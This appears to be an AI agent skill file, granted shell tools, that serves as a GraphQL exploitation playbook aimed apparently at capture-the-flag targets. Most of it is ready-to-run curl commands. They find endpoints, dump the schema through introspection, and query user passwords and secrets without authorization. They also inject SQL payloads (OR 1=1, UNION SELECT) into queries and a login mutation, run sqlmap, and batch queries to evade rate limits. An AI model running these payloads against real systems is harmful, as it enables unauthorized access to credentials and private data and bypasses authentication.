---
name: graphql
description: "GraphQL exploitation — introspection, injection, authorization bypass, and data exfiltration through GraphQL APIs."
allowed-tools: Bash Read Write
metadata:
  subdomain: execution
  when_to_use: "graphql, graphql injection, graphql sqli, introspection, graphql api, gql"
  tags: web-application, graphql, injection, api
  mitre_attack: T1190
---

# GraphQL Exploitation

Exploits GraphQL APIs for data exfiltration, SQL injection through resolvers, authentication/authorization bypass, and batch query abuse.

## Discovery
```bash
# Common GraphQL endpoints
for path in /graphql /graphiql /v1/graphql /v2/graphql /api/graphql /query /gql /graphql/console; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$path" -H 'Content-Type: application/json' -d '{"query":"{ __typename }"}')
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$path -> HTTP $code"
done

# Check for GraphiQL IDE (browser-based)
curl -s 'http://<TARGET>/graphiql' | grep -i 'graphiql\|graphql'
```

## Introspection — Schema Dump
```bash
# Quick schema overview — list all types and their fields
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}' | python3 -m json.tool

# List all query types (entry points)
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name } } type { name kind ofType { name } } } } } }"}' | python3 -m json.tool

# List all mutations
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}' | python3 -m json.tool

# Full introspection query (complete schema)
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { name type { ...TypeRef } } type { ...TypeRef } } inputFields { name type { ...TypeRef } } enumValues(includeDeprecated: true) { name } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}' | python3 -m json.tool
```

## Data Enumeration (Authorization Bypass)
```bash
# After introspection reveals types, query all data
# Replace field names based on introspection results
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id username email role password } }"}'

# Query nested/related objects
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id name secrets { id content } } }"}'

# Query with specific filters
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id: 1) { id username role password } }"}'

# Look for flag-related types/fields
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ flags { id value } }"}'
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ secrets { id content } }"}'
```

## GraphQL SQL Injection
```bash
# String argument injection
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id name } }"}'

# Union-based SQLi through GraphQL
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id: \"1 UNION SELECT 1,2,flag FROM flags--\") { id name } }"}'

# Integer argument injection
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id: \"1 OR 1=1\") { id name email } }"}'

# Mutation-based injection
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"mutation { login(username: \"admin\\\" OR 1=1--\", password: \"x\") { token } }"}'

# If sqlmap is available — use it with GraphQL
# Extract the injectable parameter and use sqlmap
sqlmap -u 'http://<TARGET>/graphql' --method POST \
  --data '{"query":"{ user(id: \"1*\") { id name } }"}' \
  -H 'Content-Type: application/json' --batch --output-dir sqlmap_graphql/
```

## Batch Query Abuse
```bash
# Send multiple queries in one request (bypass rate limiting)
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '[{"query":"{ user(id: 1) { id name } }"},{"query":"{ user(id: 2) { id name } }"},{"query":"{ user(id: 3) { id name } }"}]'

# Alias-based batching (single query, multiple operations)
curl -s 'http://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ u1: user(id: 1) { id name } u2: user(id: 2) { id name } u3: user(id: 3) { id name } }"}'
```

## Workflow
1. **Discover endpoint** — try common paths
2. **Run introspection** — dump schema to understand types/fields
3. **Enumerate data** — query all accessible types for sensitive data
4. **Check authorization** — can you access admin data without auth?
5. **Test injection** — SQLi through string/int arguments
6. **Look for flags** — in user data, secrets, config types
